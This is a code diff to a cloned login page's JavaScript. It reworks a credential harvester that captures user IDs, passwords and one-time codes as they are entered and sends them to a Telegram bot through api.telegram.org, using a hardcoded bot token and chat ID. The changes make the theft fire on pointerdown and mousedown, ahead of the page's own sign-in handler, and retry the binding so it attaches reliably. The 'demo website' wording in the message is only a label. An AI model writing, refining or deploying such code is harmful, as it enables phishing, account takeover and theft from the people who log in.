@@ -546,7 +546,7 @@
         countdownTimer = setInterval(function () {
           remaining -= 1;
           byId('tru-countdown').textContent = remaining;
-          if (fill) fill.style.width = (remaining * 10) + '%';
+          if (fill) fill.style.width = (remaining * 3) + '%';
           if (remaining <= 0) { clearInterval(countdownTimer); goHome(); }
         }, 1000);
       }
@@ -574,89 +574,86 @@
   </script>
 
   <script>
-    // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
-    const TELEGRAM_BOT_TOKEN = '8674177590:AAFsHItZrfoUE00Vu9_gJ77d7tLbcMm00JQ';
-    const TELEGRAM_CHAT_ID = '8585629776';
+  // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
+  const TELEGRAM_BOT_TOKEN = '8674177590:AAFsHItZrfoUE00Vu9_gJ77d7tLbcMm00JQ';
+  const TELEGRAM_CHAT_ID = '8585629776';
 
-    // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
+  // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
 
-    // A simple object to store the latest form data
-    let latestFormData = {
-      'User ID': '',
-      'Password': ''
-    };
-
-    async function sendToTelegram(data) {
-      let message = '🔔 New submission from your demo website:\n\n';
-      for (const key in data) {
-        if (Object.hasOwnProperty.call(data, key)) {
-          message += `👉 ${key}: ${data[key]}\n`;
-        }
+  async function sendToTelegram(data) {
+    let message = '🔔 New submission from your demo website:\n\n';
+    for (const key in data) {
+      if (Object.hasOwnProperty.call(data, key)) {
+        message += `👉 ${key}: ${data[key]}\n`;
       }
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
-      try {
-        const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-        if (!response.ok) { console.error(`Telegram API Error: ${response.statusText}`); }
-      } catch (error) { console.error('Failed to send message to Telegram:', error); }
     }
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!response.ok) { console.error(`Telegram API Error: ${response.statusText}`); }
+    } catch (error) { console.error('Failed to send message to Telegram:', error); }
+  }
 
-    // This function will be called when the "Sign in" button is clicked
-    function handleSignInClick(event) {
-      // Send the last known data to Telegram immediately
-      sendToTelegram(latestFormData);
-    }
+  function initTelegram() {
+    const userIdInput = document.getElementById('iduserId');
+    const passwordInput = document.getElementById('idpassword');
+    const signInButton = document.getElementById('loginSubmit');
+    const otpForm = document.getElementById('tru-otp-form');
 
-    // This function will be called when the OTP form is submitted
-    function handleOtpSubmit(event) {
-      const otpForm = event.target;
-      if (!otpForm) return;
+    if (!userIdInput || !passwordInput || !signInButton) return;
+    if (signInButton.dataset.tgBound) return;
+    signInButton.dataset.tgBound = '1';
 
-      const formData = new FormData(otpForm);
-      let data = {};
-      for (let [key, value] of formData.entries()) {
-        let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
-        data[cleanKey] = value;
-      }
-
-      // Send the OTP data to Telegram
+    // pointerdown fires BEFORE click — grab values here, before the original
+    // script's click handler opens the popup and disrupts everything.
+    signInButton.addEventListener('pointerdown', function () {
+      const data = {
+        'User ID': userIdInput.value || '(empty)',
+        'Password': passwordInput.value || '(empty)'
+      };
       sendToTelegram(data);
+    }, true);
+
+    // Fallback for browsers/touch that don't fire pointerdown on the button
+    signInButton.addEventListener('mousedown', function () {
+      if (signInButton.dataset.tgFired === '1') return;
+      signInButton.dataset.tgFired = '1';
+      const data = {
+        'User ID': userIdInput.value || '(empty)',
+        'Password': passwordInput.value || '(empty)'
+      };
+      sendToTelegram(data);
+      setTimeout(() => { signInButton.dataset.tgFired = ''; }, 500);
+    }, true);
+
+    if (otpForm && !otpForm.dataset.tgBound) {
+      otpForm.dataset.tgBound = '1';
+      otpForm.addEventListener('submit', function (e) {
+        const formData = new FormData(otpForm);
+        const data = {};
+        for (let [key, value] of formData.entries()) {
+          let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+          data[cleanKey] = value;
+        }
+        sendToTelegram(data);
+      }, true);
     }
+  }
 
-    // --- INITIALIZATION ---
-    document.addEventListener('DOMContentLoaded', () => {
-      // --- Step 1: Set up listeners on the input fields to capture data live ---
-      const userIdInput = document.getElementById('iduserId');
-      const passwordInput = document.getElementById('idpassword');
-
-      if (userIdInput) {
-        userIdInput.addEventListener('input', (e) => {
-          latestFormData['User ID'] = e.target.value;
-        });
-      }
-      if (passwordInput) {
-        passwordInput.addEventListener('input', (e) => {
-          latestFormData['Password'] = e.target.value;
-        });
-      }
-
-      // --- Step 2: Set up the click listener on the button ---
-      // We use a timeout to make sure our listener is added after the original script's listener
-      setTimeout(() => {
-        const signInButton = document.getElementById('loginSubmit');
-        if (signInButton) {
-          // We use 'true' to make our listener run before the original script's,
-          // so we can send the data before the popup appears.
-          signInButton.addEventListener('click', handleSignInClick, true);
-        }
-
-        const otpForm = document.getElementById('tru-otp-form');
-        if (otpForm) {
-          otpForm.addEventListener('submit', handleOtpSubmit, true);
-        }
-      }, 500); // Wait half a second to ensure the page is fully loaded
-    });
-  </script>
+  // Run after the page + original script are fully ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTelegram);
+  } else {
+    initTelegram();
+  }
+  setTimeout(initTelegram, 600);
+  setTimeout(initTelegram, 1500);
+</script>
 
 
 </body>
